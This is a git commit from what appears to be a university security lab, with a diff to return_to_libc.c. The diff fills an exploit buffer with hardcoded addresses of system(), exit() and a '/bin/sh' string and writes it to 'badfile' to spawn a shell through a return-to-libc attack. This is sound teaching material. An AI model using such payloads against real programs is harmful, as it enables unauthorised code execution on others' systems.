98c748919813c8b30dc75d58aaa59d60c7e9e0d9
yct4 <yct4@cornell.edu>
2019-09-24 21:33:34 -0700

    finished task 3

--- Labs/lab1/return_to_libc.c
+++ Labs/lab1/return_to_libc.c
@@ -21,10 +21,14 @@ void main(int argc, char **argv)
 	   of the following three statements does not imply the
 	   order of X, Y, and Z. Actually, we intentionally 
 	   scrambled the order. */
+	int i = 0;
+	for(i = 0; i < sizeof(buffer); i+=4) {
+		*(long *) &buffer[i] = 0xb7f80fb8;//0xbfffffeb; // @ "/bin/sh
+	}
 	
 	*(long *) &buffer[24] = 0xb7e5f430; // address of system()
-	*(long *) &buffer[1] = 0xbfffffeb; // address of "/bin/sh"
-	*(long *) &buffer[2] = 0xb7e52fb0; // address of exit()
+	*(long *) &buffer[32] = 0xb7f80fb8; //0xbfffffeb; // @ "/bin/sh"
+	*(long *) &buffer[28] = 0xb7e52fb0; // address of exit()
 
 	/* Save the contents to the file "badfile" */
 	badfile = fopen("./badfile", "w");
